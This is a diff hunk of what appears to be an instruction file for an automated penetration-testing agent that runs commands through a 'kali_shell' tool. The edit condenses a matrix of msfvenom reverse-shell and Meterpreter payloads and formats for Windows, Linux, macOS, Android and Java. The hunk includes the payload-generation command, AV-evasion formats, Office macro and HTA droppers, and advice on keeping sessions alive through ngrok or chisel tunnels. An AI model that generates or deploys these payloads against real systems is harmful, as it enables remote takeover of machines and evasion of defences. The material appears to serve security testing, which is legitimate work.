@@ -82,35 +82,28 @@ Generate a payload binary/script using msfvenom:
 kali_shell: "msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -f <format> -o /tmp/<output_filename>"
 ```
 
-**Payload + Format Selection Matrix:**
+**Payload + Format Selection Matrix** (STAGELESS — works through any tunnel):
 
-**CRITICAL — CHECK "Pre-Configured Payload Settings" ABOVE BEFORE CHOOSING A PAYLOAD!**
-**If ngrok or chisel is ACTIVE, you MUST use the STAGELESS column (underscore `_`). Staged payloads FAIL through tunnels — sessions die instantly in a loop.**
-**Only use staged payloads with direct connections (no tunnel).**
+**CRITICAL: CHECK "Pre-Configured Payload Settings" ABOVE. If ngrok or chisel is active, use the stageless payloads below. Staged variants FAIL through tunnels — sessions die in a loop.**
 
-| Target OS | Payload (STAGED) | Payload (STAGELESS) | Format (`-f`) | Output File | Notes |
-|-----------|-----------------------------|------------------------------------|---------------|-------------|-------|
-| Windows | `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` | `exe` | `/tmp/payload.exe` | Most common Windows payload |
-| Windows | `windows/meterpreter/reverse_https` | `windows/meterpreter_reverse_https` | `exe` | `/tmp/payload.exe` | Encrypted, firewall bypass |
-| Windows | `windows/shell_reverse_tcp` | `windows/shell_reverse_tcp` | `exe` | `/tmp/shell.exe` | Fallback (no staged variant) |
-| Windows | `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` | `psh` | `/tmp/payload.ps1` | PowerShell script (fileless) |
-| Windows | `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` | `psh-reflection` | `/tmp/payload.ps1` | Reflective PS (AV evasion) |
-| Windows | `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` | `vba` | `/tmp/payload.vba` | VBA macro code (paste into Office) |
-| Windows | `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` | `hta-psh` | `/tmp/payload.hta` | HTA with embedded PowerShell |
-| Linux | `linux/x64/meterpreter/reverse_tcp` | `linux/x64/meterpreter_reverse_tcp` | `elf` | `/tmp/payload.elf` | Standard Linux binary |
-| Linux | `linux/x64/shell_reverse_tcp` | `linux/x64/shell_reverse_tcp` | `elf` | `/tmp/shell.elf` | Shell fallback (no staged variant) |
-| Linux | `cmd/unix/reverse_bash` | `cmd/unix/reverse_bash` | `raw` | `/tmp/payload.sh` | Bash one-liner (inherently stageless) |
-| Linux | `cmd/unix/reverse_python` | `cmd/unix/reverse_python` | `raw` | `/tmp/payload.py` | Python one-liner (inherently stageless) |
-| macOS | `osx/x64/meterpreter/reverse_tcp` | `osx/x64/meterpreter_reverse_tcp` | `macho` | `/tmp/payload.macho` | macOS Mach-O binary |
-| Android | `android/meterpreter/reverse_tcp` | `android/meterpreter_reverse_tcp` | `raw` | `/tmp/payload.apk` | Android APK |
-| Java/Web | `java/meterpreter/reverse_tcp` | `java/meterpreter_reverse_tcp` | `war` | `/tmp/payload.war` | Java WAR (deploy to Tomcat/JBoss) |
-| Multi | `python/meterpreter/reverse_tcp` | `python/meterpreter_reverse_tcp` | `raw` | `/tmp/payload.py` | Python (cross-platform) |
+| Target OS | Payload (stageless) | Format (`-f`) | Output File | Notes |
+|-----------|---------------------|---------------|-------------|-------|
+| Windows | `windows/meterpreter_reverse_tcp` | `exe` | `/tmp/payload.exe` | Most common |
+| Windows | `windows/meterpreter_reverse_https` | `exe` | `/tmp/payload.exe` | Encrypted, firewall bypass |
+| Windows | `windows/shell_reverse_tcp` | `exe` | `/tmp/shell.exe` | Shell fallback |
+| Windows | `windows/meterpreter_reverse_tcp` | `psh` / `psh-reflection` | `/tmp/payload.ps1` | PowerShell (fileless / AV evasion) |
+| Windows | `windows/meterpreter_reverse_tcp` | `vba` | `/tmp/payload.vba` | VBA macro (Office) |
+| Windows | `windows/meterpreter_reverse_tcp` | `hta-psh` | `/tmp/payload.hta` | HTA wrapping PS |
+| Linux | `linux/x64/meterpreter_reverse_tcp` | `elf` | `/tmp/payload.elf` | Standard Linux |
+| Linux | `linux/x64/shell_reverse_tcp` | `elf` | `/tmp/shell.elf` | Shell fallback |
+| Linux | `cmd/unix/reverse_bash` | `raw` | `/tmp/payload.sh` | Bash one-liner |
+| Linux | `cmd/unix/reverse_python` | `raw` | `/tmp/payload.py` | Python one-liner |
+| macOS | `osx/x64/meterpreter_reverse_tcp` | `macho` | `/tmp/payload.macho` | Mach-O |
+| Android | `android/meterpreter_reverse_tcp` | `raw` | `/tmp/payload.apk` | APK |
+| Java/Web | `java/meterpreter_reverse_tcp` | `war` | `/tmp/payload.war` | Tomcat/JBoss |
+| Multi | `python/meterpreter_reverse_tcp` | `raw` | `/tmp/payload.py` | Cross-platform |
 
-**How to tell staged vs stageless apart:**
-- STAGED: `meterpreter/reverse_tcp` (slash `/` = two-stage delivery, BREAKS through any tunnel — ngrok or chisel)
-- STAGELESS: `meterpreter_reverse_tcp` (underscore `_` = single binary, WORKS through any tunnel)
-- **If using ngrok or chisel: you MUST use STAGELESS.** Only direct connections support staged payloads.
-- The handler payload MUST EXACTLY MATCH the msfvenom payload — mixing staged/stageless = silent failure
+**Staged variant (direct connections only — NOT through tunnels):** replace the underscore with a slash to switch, e.g. `windows/meterpreter_reverse_tcp` → `windows/meterpreter/reverse_tcp`. The handler payload MUST EXACTLY MATCH the msfvenom payload — mixing staged/stageless = silent failure.
 
 **Encoding for AV evasion (optional):**
 ```
